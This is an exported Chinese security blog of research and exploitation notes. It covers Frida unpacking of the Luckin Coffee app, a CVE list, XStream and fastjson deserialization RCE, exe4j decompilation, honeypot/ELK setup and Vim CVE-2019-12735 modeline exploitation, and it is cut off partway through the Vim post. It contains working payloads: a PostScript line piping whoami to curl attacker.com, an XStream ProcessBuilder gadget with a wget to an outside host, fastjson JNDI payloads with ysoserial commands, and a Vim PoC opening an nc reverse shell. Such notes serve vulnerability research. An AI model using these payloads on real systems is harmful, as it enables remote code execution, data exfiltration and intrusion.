默认浏览器都会存在缓存，除非设置为cache-control为max-age=0或者是no-store0x03 关于缓存 Cache-control头部会设置强缓存相关配置 在没有设置cache-control头部时，因为Response Header 存在 Date、Last-Modified浏览器使用LM factor 算法在没有 Cache-Control 以及 Expires 的时候，用来计算应该强制缓存多长时间所以状态码返回还是200 不是 304，如果什么缓存策略都没设置，浏览器会采用一个启发式的算法，通常会取响应头中的 Date 减去 Last-Modified 值的 10% 作为缓存时间。 命中缓存应该只需要url一致即可]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>浏览器</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[记一个frida调试瑞幸的过程]]></title>
    <url>%2F2020%2F01%2F13%2F%E8%AE%B0%E4%B8%80%E4%B8%AAfrida%E8%B0%83%E8%AF%95%E7%91%9E%E5%B9%B8%E7%9A%84%E8%BF%87%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[0x00 准备 通过pip安装frida 下载对应的frida-server到安卓端，进去运行server0x01 基本操作 adb shell dumpsys activity top即可查看该app的包名 frida-trace -U -i open com.lucky.luckyclient 调用ptrace附着在进程上进行调试，-p指定pid Frida-ps -U 列出安卓机器上运行的进程0x02 尝试使用Frida-unpack Frida-unpack，先将安卓机器里的libart.so拉出来到Mac上，一般目录是在/system/lib64下，然后通过nm libart.so| grep OpenMemory命令查看函数名，我这边看了是和脚本里一样的就不改了。 clone过来后，修改openmemory.js里的路径改为对应的包名路径，这里要注意的是不要随意修改路径，可能会导致没权限写入，修改对应包名就行。 1var file = new File("/data/data/com.lucky.luckyclient/dumps" + dex_size + ".dex", "wb") 这里改成这样 执行命令： 1frida -U -f com.lucky.luckyclient -l OpenMemory.js 可以看到hook在进行了，但是由于壳比较新，中途被检测到后强制中断失败了 0x03 试试别的思路 尝试下载了历史版本2.6.0，发现是腾讯加固，使用上面的方式可以进行dumps 但是由于版本低，登录时获取不了短信，先不管他，试着用dex2jar逆向dex试试，发现成功转成jar 通过jd-gui一个个翻翻看在文件“dumps5046568-dex2jar.jar”中的com.lucky.lib.http2.c.class中找到了AES加密算法]]></content>
      <categories>
        <category>app逆向</category>
      </categories>
      <tags>
        <tag>frida</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[vue的学习（上）]]></title>
    <url>%2F2019%2F10%2F17%2Fvue%E7%9A%84%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%8A%EF%BC%89%2F</url>
    <content type="text"><![CDATA[0x00 学习vue的简单安装下载vue代码在script标签中引入或者是引入cdn链接https://cdn.staticfile.org/vue/2.2.2/vue.min.js即可完成安装 0x01 目录树build 项目构建(webpack)相关代码config 配置目录，包括端口号等。我们初学可以使用默认的。node modules npm 加载的项目依赖模块src 这里是我们要开发的目录，基本上要做的事情都在这个目录里。里面包含了几个目录及文件： assets: 放置一些图片，如logo等。 components: 目录里面放了一个组件文件，可以不用。 App.vue: 项目入口文件，我们也可以直接将组件写这里，而不使用 components 目录。 main.js: 项目的核心文件。static. 静态资源目录，如图片、字体等。test 初始测试目录，可删除.xxxx文件 这些是一些配置文件，包括语法配置，git配置等。index.html 首页入口文件，你可以添加一些 meta 信息或统计代码啥的。package.json 项目配置文件。README.md 项目的说明文档，markdown 格式 0x02 简单的代码示例123456789101112131415161718192021222324252627282930313233343536373839&lt;div id="app"&gt; &lt;label for="r1"&gt;修改颜色&lt;/label&gt;&lt;input type="checkbox" v-model="use" id="r1"&gt; &lt;br&gt;&lt;br&gt; &lt;div v-bind:class="&#123;'class1': use&#125;"&gt; v-bind:class 指令 &lt;/div&gt;&lt;/div&gt; &lt;script&gt;new Vue(&#123; el: '#app', data:&#123; use: false &#125;, methods:&#123; hello:function()&#123;&#125; &#125;, filters:&#123; //过滤器，通过|符号调用，如 &#123;&#123; message | capitalize &#125;&#125;，可以串联可以接受参数 capitalize:function(value)&#123;&#125; &#125;, computed: &#123; // 计算属性的 getter reversedMessage: function () &#123; // `this` 指向 vm 实例 return this.message.split('').reverse().join('') &#125; &#125;, watch:&#123; //监听变量改变，函数名=需监听的变量名 use:function(val)&#123; &#125;, components: &#123; // &lt;runoob&gt; 将只在父模板可用 'runoob': Child &#125; &#125;&#125;);&lt;/script&gt; 实现单选框改变样式 0x03 一些指令作用的记录注意：必须要带双引号 v-html 用于插入html标签 v-model 用户输入改变变量值 v-bind 用于绑定属性的值，可以是变量或者表达式之类的 v-bind:class=“{‘class1’:var}” 通过var的true或false控制class的应用 v-bind:href=“url” 通过控制url的值来改变其链接，等于:href=“url” v-biind:id=“‘a’+id” 通过js表达式改变值，等于:id=“‘a’+id” …… v-if=变量 根据变量的值进行判断是否应用 v-show=”ok” 可以展示元素 v-on:click=”reverseMessage” 类似于onclick的时候执行后面的函数，等于@click=”reverseMessage”0x04 条件语句1234567891011121314151617181920212223&lt;div id="app"&gt; &lt;div v-if="type === 'A'"&gt; A &lt;/div&gt; &lt;div v-else-if="type === 'B'"&gt; B &lt;/div&gt; &lt;div v-else-if="type === 'C'"&gt; C &lt;/div&gt; &lt;div v-else&gt; Not A/B/C &lt;/div&gt;&lt;/div&gt; &lt;script&gt;new Vue(&#123; el: '#app', data: &#123; type: 'C' &#125;&#125;)&lt;/script&gt; 上面是指令的写法，下面是字符串模版的写法1234&lt;!-- Handlebars 模板 --&gt;&#123;&#123;#if ok&#125;&#125; &lt;h1&gt;Yes&lt;/h1&gt;&#123;&#123;/if&#125;&#125; 0x05 循环基本for循环使用1234567891011121314151617181920&lt;div id="app"&gt; &lt;ol&gt; &lt;li v-for="site in sites"&gt; &#123;&#123; site.name &#125;&#125; &lt;/li&gt; &lt;/ol&gt;&lt;/div&gt; &lt;script&gt;new Vue(&#123; el: '#app', data: &#123; sites: [ &#123; name: 'Runoob' &#125;, &#123; name: 'Google' &#125;, &#123; name: 'Taobao' &#125; ] &#125;&#125;)&lt;/script&gt; 模板中使用for循环123456&lt;ul&gt; &lt;template v-for="site in sites"&gt; &lt;li&gt;&#123;&#123; site.name &#125;&#125;&lt;/li&gt; &lt;li&gt;--------------&lt;/li&gt; &lt;/template&gt;&lt;/ul&gt; 迭代对象取keyvalue1234567&lt;div id="app"&gt; &lt;ul&gt; &lt;li v-for="(value, key, index) in object"&gt; &#123;&#123; index &#125;&#125;. &#123;&#123; key &#125;&#125; : &#123;&#123; value &#125;&#125; &lt;/li&gt; &lt;/ul&gt;&lt;/div&gt; 循环取整数1234567&lt;div id="app"&gt; &lt;ul&gt; &lt;li v-for="n in 10"&gt; &#123;&#123; n &#125;&#125; &lt;/li&gt; &lt;/ul&gt;&lt;/div&gt; 0x06 计算属性原始属性、计算属性、方法12345678910111213141516171819202122232425262728&lt;body&gt;&lt;div id="app"&gt; &lt;p&gt;原始字符串: &#123;&#123; message &#125;&#125;&lt;/p&gt; &lt;p&gt;计算后反转字符串: &#123;&#123; reversedMessage &#125;&#125;&lt;/p&gt; &lt;p&gt;使用方法后反转字符串: &#123;&#123; reversedMessage2() &#125;&#125;&lt;/p&gt;&lt;/div&gt;&lt;script&gt;var vm = new Vue(&#123; el: '#app', data: &#123; message: 'Runoob!' &#125;, computed: &#123; // 计算属性的 getter reversedMessage: function () &#123; // `this` 指向 vm 实例 return this.message.split('').reverse().join('') &#125; &#125;, methods: &#123; reversedMessage2: function () &#123; return this.message.split('').reverse().join('') &#125; &#125;&#125;)&lt;/script&gt;&lt;/body&gt; 可以说使用 computed 性能会更好，但是如果你不希望缓存，你可以使用 methods 属性。计算属性默认提供getter但是也可以设置setter12345678910111213141516171819202122232425262728&lt;script&gt;var vm = new Vue(&#123; el: '#app', data: &#123; name: 'Google', url: 'http://www.google.com' &#125;, computed: &#123; site: &#123; // getter get: function () &#123; return this.name + ' ' + this.url &#125;, // setter set: function (newValue) &#123; var names = newValue.split(' ') this.name = names[0] this.url = names[names.length - 1] &#125; &#125; &#125;&#125;)// 调用 setter， vm.name 和 vm.url 也会被对应更新vm.site = '菜鸟教程 http://www.runoob.com';document.write('name: ' + vm.name);document.write('&lt;br&gt;');document.write('url: ' + vm.url);&lt;/script&gt; 0x07 属性变更监听一个是watch，一个是vm.$watch(变量，回调)123456789101112131415161718192021222324252627282930313233&lt;div id = "computed_props"&gt; 千米 : &lt;input type = "text" v-model = "kilometers"&gt; 米 : &lt;input type = "text" v-model = "meters"&gt;&lt;/div&gt;&lt;p id="info"&gt;&lt;/p&gt;&lt;script type = "text/javascript"&gt; var vm = new Vue(&#123; el: '#computed_props', data: &#123; kilometers : 0, meters:0 &#125;, methods: &#123; &#125;, computed :&#123; &#125;, watch : &#123; kilometers:function(val) &#123; this.kilometers = val; this.meters = this.kilometers * 1000 &#125;, meters : function (val) &#123; this.kilometers = val/ 1000; this.meters = val; &#125; &#125; &#125;); // $watch 是一个实例方法 vm.$watch('kilometers', function (newValue, oldValue) &#123; // 这个回调将在 vm.kilometers 改变后调用 document.getElementById ("info").innerHTML = "修改前值为: " + oldValue + "，修改后值为: " + newValue;&#125;)&lt;/script&gt; 0x07 修饰符事件修饰符123456789101112131415&lt;!-- 阻止单击事件冒泡 --&gt;&lt;a v-on:click.stop="doThis"&gt;&lt;/a&gt;&lt;!-- 提交事件不再重载页面 --&gt;&lt;form v-on:submit.prevent="onSubmit"&gt;&lt;/form&gt;&lt;!-- 修饰符可以串联 --&gt;&lt;a v-on:click.stop.prevent="doThat"&gt;&lt;/a&gt;&lt;!-- 只有修饰符 --&gt;&lt;form v-on:submit.prevent&gt;&lt;/form&gt;&lt;!-- 添加事件侦听器时使用事件捕获模式 --&gt;&lt;div v-on:click.capture="doThis"&gt;...&lt;/div&gt;&lt;!-- 只当事件在该元素本身（而不是子元素）触发时触发回调 --&gt;&lt;div v-on:click.self="doThat"&gt;...&lt;/div&gt;&lt;!-- click 事件只能点击一次，2.1.4版本新增 --&gt;&lt;a v-on:click.once="doThis"&gt;&lt;/a&gt; 按键修饰符1234567&lt;!-- 只有在 keyCode 是 13 时调用 vm.submit() --&gt;&lt;input v-on:keyup.13="submit"&gt;&lt;!-- 同上 --&gt;&lt;input v-on:keyup.enter="submit"&gt;&lt;!-- 缩写语法 --&gt;&lt;input @keyup.enter="submit"&gt; 全部的按键别名：.enter.tab.delete (捕获 “删除” 和 “退格” 键).esc.space.up.down.left.right.ctrl.alt.shift.meta1234&lt;p&gt;&lt;!-- Alt + C --&gt;&lt;input @keyup.alt.67="clear"&gt;&lt;!-- Ctrl + Click --&gt;&lt;div @click.ctrl="doSomething"&gt;Do something&lt;/div&gt;]]></content>
      <categories>
        <category>javascript</category>
      </categories>
      <tags>
        <tag>vue</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[热门CVE记录（一）]]></title>
    <url>%2F2019%2F10%2F09%2F%E7%83%AD%E9%97%A8CVE%E8%AE%B0%E5%BD%95%EF%BC%88%E4%B8%80%EF%BC%89%2F</url>
    <content type="text"><![CDATA[路由器DlinkCVE-2019-16920 | 20191005 | CVE-2019-16920 poc javaxstreamCVE-2019-10173 | 20190720 | 反序列化 jiraCVE-2019-14994 | 20190919 | url path traversal | /..;/CVE-2019–11581｜20190601｜rce | 印象笔记CVE-2019-8451 | 20190925 | ssrf | ssrf png phpjoomla3.4.6rce ｜ 20191008｜expphp RCE CVE-2019-11043 | 20191024 | 攻击工具NhttpdCVE-2019-16278 ｜ 20191015 ｜ url path traversal ice CVE-2019-16278 SSRFImage / Video converters : Image magick : CVE-2016–3718(fill ‘url(http://attacker.com/)&#39;) CVE-2016–3718 / FFMPEG : CVE-2017–9993 (gen_xbin_playlist(playlist_location)) postscriptCVE-2016-3714CVE-2018-16509CVE-2019-6116CVE-2016-7976 RCE on PDF upload:1234%!PScurrentdevice null true mark /OutputICCProfile (%pipe%curl attacker.com/?a=$(whoami|base64) ).putdeviceparamsquit]]></content>
      <categories>
        <category>CVE记录</category>
      </categories>
      <tags>
        <tag>CVE记录</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[scapy发送TLS自定义包]]></title>
    <url>%2F2019%2F09%2F10%2Fscapy%E5%8F%91%E9%80%81TLS%E8%87%AA%E5%AE%9A%E4%B9%89%E5%8C%85%2F</url>
    <content type="text"><![CDATA[00 安装配置scapy直接从github上下载scapy源码，然后进入到目录中运行即可。由于TLS并不是默认开启的layer，所以需要在配置项中的layer里加入tls。运行后输入TLS查看是否报错，如果没有报错说明TLS层的启用正常。 01 构造TLS请求经过一系列的研究尝试，得出如下构造hello包的代码：123456789sn = ServerName(servername="&lt;put server name here&gt;\x00\x00\x00\0")ext = [TLS_Ext_SupportedGroups(groups=["secp256r1"]), TLS_Ext_ServerName(servernames=[sn]), TLS_Ext_KeyShare_CH(client_shares=[KeyShareEntry(group=23)]), # noqa: E501 # TLS_Ext_SupportedVersions(versions=["TLS 1.3-d18"]), TLS_Ext_SignatureAlgorithms(sig_algs=["sha256+rsapss", "sha256+rsa"])]p = TLSClientHello(ciphers=0x1301, ext=ext)TLSClientAutomaton(server="mail.xxxx.com",dport=995,client_hello=p).run() Servername那个参数可以替换成任意的服务器名即可达到我们的目的]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>scapy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[修改tpot蜜罐为主控+探测器模式]]></title>
    <url>%2F2019%2F08%2F29%2F%E4%BF%AE%E6%94%B9tpot%E8%9C%9C%E7%BD%90%E4%B8%BA%E4%B8%BB%E6%8E%A7%2B%E6%8E%A2%E6%B5%8B%E5%99%A8%E6%A8%A1%E5%BC%8F%2F</url>
    <content type="text"><![CDATA[0x00 关于tpot相关Tpot我个人理解是一个比较不错的高集成度的蜜罐系统，里面有很多的蜜罐使用docker封装起来独立运行。tpot则将每一个独立的蜜罐的日志格式整理起来最终通过ELK的形式统一展示，效果非常不错，下面是控制端的图：这界面，这特效，没什么好说的就是棒，就是赛博朋克！另外dashboard的模板不止一个，所以很不错，搜索那边日志也分割的很清晰，可以搜集到很多有用的信息。如果我们不需要主控和探测分离，也就是所有的东西都装在一台机器上的话，可以不用看后面的内容，只需要找个可以上传自定义镜像的vps，然后安装标准版然后打开即可用，没有什么好说的。现在我们希望实现的是如下模式： ————-> sensor1controller | —————>sensor2即部署主从模式的蜜罐，仅仅在外网部署N个探测器，然后将日志信息全部集中到一台主控端上进行分析处理。我翻了一下tpot，貌似没有天生将主控和探测器分离安装，因此要实现这种形式需要手工进行分离ELK。既然整个tpot日志分析都基于ELK，那么我们要做的也很简单，将elasticsearch和kibana分离出来作为主控端，每个sensor上部署logstash，logstash的日志发送地址全部发送到主控的elasticsearch就好了。补一个tpot的地址：tpot官网 0x01 提取主控 为了提取主控中的ES和logstash以及其他可能比较喜欢的辅助工具，可以先在自己的本地起个虚拟机，安装标准版的tpot，即安装的时候选择standard，等待安装完毕。 然后我们要做的就是完成安装后进到系统里，默认启动后会自动启动所有的docker实例。使用docker命令将我们需要的实例单独打包成镜像倒出来，我们最需要的目前是elasticsearch、kibana、logstash，如果还有其他需要的也可以倒出来。打包成镜像的命令为：123sudo docker commit xxxx:xxx //commit container to imagessudo docker save xxxx &gt; xxx.tar //package the image to tarsudo docker inspect xxx //details of image or container 然后把打包好的tar包保存起来，放到需要成为主控的地方重新转成container：1sudo docker load -i xxx.tar //import images from tar 这里要注意的是es的容器其使用了虚拟机本地的data目录，建议把data目录里的数据一并考出去然后使移植过的es容器的data目录挂载到这个目录上，类似于：1sudo docker run -d -p 59200:9200 -v /mnt/nas/honeyportdata:/data:rw --name tpotes tpotes /usr/share/elasticsearch/bin/elasticsearch PS：建议在迁移的时候关注一下这几个容器的详细信息，里面会写着端口映射、目录映射、执行命令等，通过docker inspect命令。 0x02 sensor和主控 首先我们要先部署tpot，找一个可以支持自定义镜像上传的vps厂家，我使用的是vultr，虚拟机一定要选8G4核以上的配置，不然会出一堆问题。 然后进入到安装界面就没什么好说的了，省去不说了，在VPS上我们选择安装模式的时候记得选sensor，因为我们只需要VPS上具备探测器功能即可。 将之前分离出来的logstash镜像的tar包上传到sensor上，根据这个镜像起一个docker的容器实例。 主控这边使用之前提取出来的es和kibana镜像在本地创建实例，然后将复制出来的es的data目录映射到容器的es里，起来即可0x03 打通主控与sensor之间的日志传递 先来说说logstash，主要是负责收集sensor的日志并发送给es，直接通过docker exec进入到logstash容器中，修改其配置文件，将本地的es地址改为远程接收的地址，保存重启容器即可。 再来看看es，建议es先加个密码认证，密码认证直接在es容器里使用es自己的命令，里面有个生成password命令，敲一下跟着流程走就好，记录下密码后记得在logstash里也配上密码。其次确保ES的端口对外暴露，安全起见可以防火墙限制IP访问。es和logstash两边都通，logstash能正常推送给es就会在本地看到数据了。 如果ES在局域网内网，可能需要通过一些代理映射打通，如果通过花生壳之类的将ES映射到域名上，由于logstash不能配置域名，因此可以在sensor上在装个nginx进行反带处理，其他流程一致。 另外由于sensor与es之间可能网络不太好，建议配置nginx反带的超时时间长一些，logstash也配置一下超时时间，太短了容易一直报错0x04 目前存在的疑惑连续好几次挂了一晚上，sensor上的容器就全部丢失了，很奇怪没有查到原因。0x05 其他本文仅仅是一个思路的概括和一些坑的提示，具体ELK怎么操作和配置建议自行学习掌握，没那么复杂。]]></content>
      <categories>
        <category>蜜罐</category>
      </categories>
      <tags>
        <tag>honeypot</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ELK安装使用相关记录]]></title>
    <url>%2F2019%2F08%2F13%2FELK%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8%E7%9B%B8%E5%85%B3%E8%AE%B0%E5%BD%95%2F</url>
    <content type="text"><![CDATA[0x00 ELK大概介绍ELK就是elastic search+logstash+kibana，然后logstash通常还要配上beats，简单的逻辑是：beats -> logstash->elastic search ->kibana beats是轻量型的数据采集装置，采集好数据后发送给logstash logstash就像是一个日志搜集管道，里面带了一些日志格式的过滤插件，最后整合成统一格式的数据发送给elasticsearch elasticsearch拿到数据后存起来就可以开始根据配置进行搜索了，提供了restful的接口 kibana作为开源通用的界面帮助我们快速的利用elasticsearch进行搜索 0x01 ELK安装Ubuntu为例，现在官方提供了一系列的安装方式，可以直接参照官方文档进行安装即可。这里使用的是apt的安装方式： sudo apt-get install apt-transport-https echo “deb https://artifacts.elastic.co/packages/7.x/apt stable main” | sudo tee -a /etc/apt/sources.list.d/elastic-7.x.list sudo apt-get update &amp;&amp; sudo apt-get install elasticsearch logstash kibana beats的话要根据实际采集的数据格式去下载，比如mysql的话去下载mysqlbeats 0x02 配置密码认证 elasticsearch上新版本已经集成了xpack，进入到bin目录下，使用elasticsearch-setup-password interactive来交互性的设置密码，并且将密码记录下来 kibana中需要配置es的user和password选项，并且注意kibana的basepath logstash中在output的es配置中配置正确的hosts、user、password选项，注意logstash的hosts可以接受域名，但是域名和端口必须能用IP访问，为了解决这个问题可以使用nginx代理来代理一层 0x99 java环境ELK依赖于Java环境，官方说最好建议使用oracle jdk8，oracle现在下载jdk需要登陆注册，因此直接手工去下载包解压缩后手工配置。 创建java的目录：mkdir /usr/lib/jvm 下载并解压tar包：sudo tar -zxvf /home/Downloads/jdk-8u221-linux-x64.tar.gz -C /usr/lib/jvm 为了便于java版本管理，这里使用Linux包版本管理工具update-alternatives其本质是软连接的管理，因此我们直接将javahome做软连接 sudo update-alternatives —install /usr/local/jdk jdk /usr/lib/jvm/jdk-8u22XXXXXX 300 然后将该软连接的jdk目录写入到环境变量中作为javahome： 12345#set oracle jdk environmentexport JAVA_HOME=/usr/local/jdk ## 这里要注意目录要换成自己解压的jdk 目录export JRE_HOME=$&#123;JAVA_HOME&#125;/jreexport CLASSPATH=.:$&#123;JAVA_HOME&#125;/lib:$&#123;JRE_HOME&#125;/libexport PATH=$&#123;JAVA_HOME&#125;/bin:$PATH 以后如果需要切换jdk版本，先通过install的方式注册jdk，然后通过命令：update-alternatives —config jdk来进行切换，install的时候后面的数字是优先级，在auto模式的时候有用默认根据数字大的优先作为版本使用]]></content>
      <categories>
        <category>大数据</category>
      </categories>
      <tags>
        <tag>elk</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[xstream-1.4.10反序列化漏洞]]></title>
    <url>%2F2019%2F07%2F25%2Fxstream-1.4.10%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[0x00 CVE-2019-10173参考http://x-stream.github.io/changes.html#1.4.11 0x01 payload123456789101112131415&lt;sorted-set&gt;&lt;string&gt;foo&lt;/string&gt;&lt;dynamic-proxy&gt;&lt;interface&gt;java.lang.Comparable&lt;/interface&gt;&lt;handler class="java.beans.EventHandler"&gt;&lt;target class="java.lang.ProcessBuilder"&gt;&lt;command&gt;&lt;string&gt;ping&lt;/string&gt;&lt;string&gt;xxxxx&lt;/string&gt;&lt;/command&gt;&lt;/target&gt;&lt;action&gt;start&lt;/action&gt;&lt;/handler&gt;&lt;/dynamic-proxy&gt;&lt;/sorted-set&gt; 可能的变形(似乎并不行)：1&#123;"sorted-set":&#123;"string":"foo","dynamic-proxy":&#123;"interface":"java.lang.Comparable","handler":&#123;"class":"java.beans.EventHandler","target":&#123;"class":"java.lang.ProcessBuilder","command":["wget","http://2nmquk.ceye.io"]&#125;,"action":"start"&#125;&#125;&#125;&#125; 0x02 说明XML的payload是没问题的，json这些是改的，不见得可以，主要问题在于那个XML属性不知道怎么对应到json格式，不过xstream的反序列化函数确实是支持json和XML同时传入的]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>xstream</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[fastjson的RCE漏洞复现记录]]></title>
    <url>%2F2019%2F07%2F13%2Ffastjson%E7%9A%84RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95%2F</url>
    <content type="text"><![CDATA[0x00 关于fastjson反正是阿里巴巴的一个开源json库，java站都爱用，还有比如Jackson、gson什么的，Jackson也有RCE问题。fastjson主要几次问题都在于autotype，其实我也不太懂autotype，可能@type的形式就叫aotutype吧。关于开关fastjson的autotype以及白名单配置https://github.com/alibaba/fastjson/wiki/enable_autotype 0x01 关于反序列化之前的autotype存在反序列化的问题，48版本后又多了个绕过autotype设置的问题，以至于不管你是否开启autotype，使用@type都可以触发反序列化，目前的修复方案好像也只是优化了黑名单，并没有从本质上解决这个问题。目前出问题的是java.lang.Class可以构造出其他的反序列化利用链，而因为种种问题参考fastjson漏洞分析，http://xz.aliyun.com/t/5680可以绕过黑名单和autotypesuport的校验。 0x02 payload{&quot;name&quot;:{&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;},&quot;x&quot;:{&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://localhost:1099/Exploit&quot;,&quot;autoCommit&quot;:true}}}本次利用的形式如上，后面的利用链可以更换成以前的其他类似的payload均可以，因此有很多种变种。将下面这个github里的历史payload改造成上面这种就好了github历史payload 0x03 一些利用利用的思路可以看看这个文章fastjson利用总结，思路是差不多的，具体payload参考上面那个github改一改，这文章里有个直接执行命令的利用方法可以关注一下（意思是不需要搭建rmi和ldap的那种）新增： fastjson\&lt;1.2.58版本的新的利用链https://github.com/mikuKeeper/CVE-2019-12384该利用链同样适用于Jackson，不如说本来也就是Jackson那边爆出来的0x04 利用的时候一些重点注意事项 利用的时候其实会受到目标使用的jdk版本影响，如果要绕过jdk版本的话需要利用的绕过方法也受到目标是否存在对应利用链的问题 利用的时候ldap和rmi其实一定程度上是等价的，建议使用ldap 利用的时候ldap能收到目标发送的请求但是没有通过reference请求到web服务获取exploit.class的原因就是前面说的jdk版本问题 ldap收到了请求就可以认为目标存在fastjson漏洞，至于能不能饶过版本限制就是后面的事情了，可以根据这个特性做个批量检测工具 关于版本饶过的详细总结可以看这个饶过jdk版本限制 貌似在未开启autotypesuport配置情况下，需要发两次请求触发缓存 利用时候的exp本身也需要满足jdk版本要求，比较简单的做法是使用jdk6来生成exp 0x05关于测试环境测试环境可以使用vulhub的fastjson环境，该环境目前已知有两个问题： centos7可能会出现docker build失败的问题，rm命令执行错误，换个ubuntu就好了 该环境的jdk版本也是过高导致有限制，因此会导致无法触发reference的http请求从而命令执行问题，饶过参考上面，或者换个jdk版本 关于服务搭建，建议不要搭建rmi服务，因为目前看来和ldap等价，而ldap服务具有饶过的可能，因此直接使用ldap就好了。如果使用饶过则需要修改ladp服务器的部分代码，依旧是参考上面饶过的那篇文章最后提到的那段。bypass的github关于代码修改后的编译问题： mvn compile 会生产class文件，会产生不带依赖的jar包 mvn install 不仅会生产class还会生产jar和带依赖的jar 如果部分版本冲突可以尝试修改pom文件里的版本信息 java -cp Jar 包地址 person.server.LdapServer 就可以启动ldap服务，这个是通过编译的来的jar包里的class启动的server，通过marshalsec的话也是启动的marshalsec包里的ldap服务 0x06 扩展由于饶过姿势太多，后续可能考虑编写一个统一的检测工具，依赖于修改ldap服务器使其针对不同的请求返回不同的利用链payload，依照这个思路来做检测。 0x07 关于java反序列化几个工具可以看一下 marshalsec ysoserial Java反序列化备忘录文章备忘录javaruntime.exec payload生成KM29Nw2ydMpJ8kRz 1java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections6 ‘命令' |base64 | sed ':t;N;s/\n//;b t'&gt; tmp1 //生成基于commonscollections6的payload启动通过返回属性触发gadget的绕过方式的ldap：1java -cp fastjson-poc-1.0-SNAPSHOT-jar-with-dependencies.jar person.server.ldap_bypass_jdklimit.Ldap_javaSerializedData http://papa.mikudapangcin:11111/#Exploit 389 可以通过生成多个gadget来绕过限制]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>fastjson</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[exe4j生成的exe文件反编译记录]]></title>
    <url>%2F2019%2F06%2F25%2Fexe4j%E7%94%9F%E6%88%90%E7%9A%84exe%E6%96%87%E4%BB%B6%E5%8F%8D%E7%BC%96%E8%AF%91%E8%AE%B0%E5%BD%95%2F</url>
    <content type="text"><![CDATA[exe4jExe4j是一款经典的讲java程序打包成一个exe程序的软件，没什么其他好说的。 识别是否exe4j我是通过程序中报错信息打印出的堆栈信息中含有exe4j包名来判断的，也可以直接通过下面提供的程序处理一下后看看生成的文件能不能用zip解压出java类来判断。 exe4j逆向处理程序代码直接贴出代码：12345678910111213141516171819202122import java.util.*;import java.io.*;public class gen &#123; public static void main(String args[]) throws IOException &#123; FileInputStream fin = new FileInputStream(args[0]); FileOutputStream fout = new FileOutputStream(args[1]); BufferedInputStream bin = new BufferedInputStream(fin); BufferedOutputStream bout = new BufferedOutputStream(fout); int in = 0; do &#123; in = bin.read(); if (in == -1) break; in ^= 0x88; bout.write(in); &#125; while (true); bin.close(); fin.close(); bout.close(); fout.close(); &#125;&#125; 将这个程序保存为gen.java，名字不可以改，通过以下命令来编译： 12javac gen.javajava gen.class 需要转换的exe文件名 转换后的输出文件名 使用zip解压软件直接解压输出的文件 正常解压后会出现java类文件，拖入jd-gui里就可以按照java逆向来走了]]></content>
      <categories>
        <category>客户端逆向</category>
      </categories>
      <tags>
        <tag>exe4j程序逆向</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[基于VIM宏的后门-深入利用VIM漏洞CVE-2019-12735]]></title>
    <url>%2F2019%2F06%2F20%2F%E5%9F%BA%E4%BA%8EVIM%E5%AE%8F%E7%9A%84%E5%90%8E%E9%97%A8-%E6%B7%B1%E5%85%A5%E5%88%A9%E7%94%A8VIM%E6%BC%8F%E6%B4%9ECVE-2019-12735%2F</url>
    <content type="text"><![CDATA[0x00 引言作为一个vim多年使用者，前两天得知爆出个VIM的RCE漏洞搞的我有点害怕，因此特意对这个漏洞的利用进行了一些研究。由于本人是个菜的抠脚的脚本小子，因此并不会在这篇文章中去给大家解释漏洞原因，作为脚本小子我只关心如何利用。至于漏洞原因的一些解释可以去原作者的git上去看原作者GITHUB 0x01 漏洞复现先讲一下如何漏洞复现，复现该漏洞的基本条件是： Vim版本在影响范围内，目前大部分版本都有受影响，至少我最近开启的GCP上的ubuntu默认的vim版本在8.0左右是受影响的。 必须开启modeline选项，这个选项很关键，我的GCP上默认是不开启的，所以严重降低了该漏洞的危害，不太确定低版本或者是一些衍生版本的vim会不会默认开启。 复现poc1过程： 在～/.vimrc中加入set modeline确保开启该选项12. 使用原作者的第一个poc直接写入一个文件并保存：\`:!uname -a||" vi:fen:fdm=expr:fde=assertfails("source\!\ \%"):fdl=0:fdt=" `3. 然后使用vim打开该文件，如果受影响就会执行打印uname -a的结果，如果不受影响就是一个普通的文本 复现poc2过程：先来看看原作者在git上写着的poc2:1\x1b\[?7l\x1bSNothing here.\x1b:silent! w | call system(\'nohup nc 127.0.0.1 9999 -e /bin/sh &amp;\') | redraw! | file | silent! # " vim: set fen fdm=expr fde=assert\_fails(\'set\\ fde=x\\ \\|\\ source\\!\\ \\%\') fdl=0: \x16\x1b\[1G\x16\x1b\[KNothing here."\x16\x1b\[D \\n 如果你只是检测的话可以不用看这个poc，这个poc主要是用来贴近实战的利用。我估计会有人使用这个poc1成功，但是使用poc2始终不成功，其实这个poc有几个地方需要改一下（准确来说是不能复制黏贴）： 这里面涉及到的十六进制比如\x1b是需要通过二进制编辑器直接改成二进制的，复制黏贴是不行的。将poc中所有的十六进制位置编辑成二进制即可。 反斜杠的问题，原poc中作者为了转义特殊符号来显示所以多加了反斜杠，将所有涉及到转义的字符前面多一个的反斜杠“\”去掉就可以了 必要的话将最后的\n直接改成回车，如果\n在你的文本里没有被解释成回车的话 按照上面说的流程修改完poc后，我们在测试机本地起个nc监听：1nc -lvp 9999 最后打开poc2即可看到nc获取到了反弹链接。 0x02 